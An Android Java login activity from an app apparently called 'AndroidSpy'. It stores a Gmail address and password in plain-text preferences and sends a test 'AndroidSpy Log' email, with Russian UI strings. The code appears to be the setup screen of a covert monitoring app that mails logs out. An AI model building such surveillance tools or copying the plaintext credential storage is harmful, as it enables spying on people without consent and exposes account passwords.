package ru.itsolution.androidspy;

import android.app.Activity;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

/**
 * Activity which displays a login screen to the user, offering registration as
 * well.
 */
public class LoginActivity extends Activity {
	private String mEmail;
	private String mPass;
	private EditText mEmailView;
	private EditText mPasswordView;
	
	private SharedPreferences prefs;
	private Button mBtn;
	private Button mTest;
	private boolean attached;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_login);
		prefs = getSharedPreferences("email", MODE_PRIVATE);
		
		mEmail = prefs.getString("email", "");
		mPass = prefs.getString("pass", "");

		mEmailView = (EditText) findViewById(R.id.email);
		mEmailView.setText(mEmail);
		
		attached = false;

		mPasswordView = (EditText) findViewById(R.id.password);
		mPasswordView.setText(mPass);
		
		mBtn = (Button) findViewById(R.id.btn);
		mBtn.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				if (attached) {
					setDetached();
					Editor edit = prefs.edit();
					edit.clear();
					edit.commit();
				} else {
					setEmail();
				}
			}
		});
		
		mTest = (Button) findViewById(R.id.test);
		mTest.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				mTest.setEnabled(false);
				testMessage();
			}

			private void testMessage() {
				mEmail = mEmailView.getText().toString();
				mPass = mPasswordView.getText().toString();
				final Mail m = new Mail(mEmail ,mPass); 
				String[] toArr = {mEmail}; 
				m.setTo(toArr); 
				m.setFrom("AndroidSpy"); 
				m.setSubject("AndroidSpy Log"); 
				m.setBody("Тестовое сообщение");
				new AsyncTask<Void, Void, Boolean>() {

					@Override
					protected Boolean doInBackground(Void... params) {
						try {
							m.send();
						} catch (Exception e) {
							return false;
						}
						return true;
					}
					
					protected void onPostExecute(Boolean result) {
						mTest.setEnabled(true);
						if (result) {
							Toast.makeText(LoginActivity.this, "Успешная отправка, проверьте почту!", Toast.LENGTH_SHORT).show();
						} else {
							setDetached();
							Editor edit = prefs.edit();
							edit.clear();
							edit.commit();
							Toast.makeText(LoginActivity.this, "Невозможно отправить почту, проверьте настройки", Toast.LENGTH_SHORT).show();
						}
					};

				}.execute();
			}
		});
		if (!mEmail.equals("")) {
			setAttached();
		}
	}
	
	private void setAttached() {
		mPasswordView.setVisibility(View.GONE);
		attached = true;
		mEmailView.setEnabled(false);
		mBtn.setText(R.string.action_sign_in_unregister);
		mTest.setVisibility(View.VISIBLE);
	}
	
	private void setDetached() {
		mPasswordView.setVisibility(View.VISIBLE);
		attached = false;
		mEmailView.setEnabled(true);
		mBtn.setText(R.string.action_sign_in_register);
		mEmailView.setText("");
		mPasswordView.setText("");
		mTest.setVisibility(View.GONE);
	}

	public void setEmail() {
		mEmailView.setError(null);
		mPasswordView.setError(null);
		
		if (TextUtils.isEmpty(mPasswordView.getText().toString())) {
			mPasswordView.setError(getString(R.string.error_field_required));
			return;
		}
		
		if (TextUtils.isEmpty(mEmailView.getText().toString())) {
			mEmailView.setError(getString(R.string.error_field_required));
			return;
		} else if (!mEmailView.getText().toString().contains("@gmail.com")) {
			mEmailView.setError(getString(R.string.error_invalid_email));
			return;
		}
		
		setAttached();
		
		Editor edit = prefs.edit();
		edit.putString("email", mEmailView.getText().toString());
		edit.putString("pass", mPasswordView.getText().toString());
		edit.commit();
	}
}
